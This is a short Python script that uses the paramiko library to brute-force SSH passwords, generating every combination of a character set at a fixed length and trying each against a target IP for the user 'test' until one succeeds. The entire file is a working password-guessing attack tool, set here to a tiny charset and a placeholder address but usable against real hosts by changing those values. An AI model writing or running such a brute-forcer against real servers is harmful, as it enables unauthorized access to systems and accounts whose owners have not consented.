import itertools as it
import string

import paramiko

def create_client():
    client = paramiko.SSHClient()
    client_policy = paramiko.AutoAddPolicy()
    client.set_missing_host_key_policy(client_policy)
    return client

class Brutes:
    def __init__(self, charset, length, ip):
        self.charset = charset
        self.length = length
        self.ip = ip

    def crackit(self, username):
        client = create_client()
        for guess in self.guesses:
            try:
                print(guess)
                client.connect(self.ip, username=username, password=guess, timeout=0.5)
                print('The password is {}'.format(guess))
                return guess
            except paramiko.AuthenticationException as e:
                print('{} is not it.'.format(guess))
            finally:
                client.close()

    @property
    def guesses(self):
        for guess in it.product(self.charset, repeat=self.length):
            yield ''.join(guess)

def main():
    charset = 'aspeb'#'pqrstuvwxyzabcdefghijklmno'
    ip = '0.0.0.0'
    brute = Brutes(charset, 4, ip)
    password = brute.crackit(username='test')
    if password:
        print('Found {}'.format(password))

if __name__ == '__main__':
    main()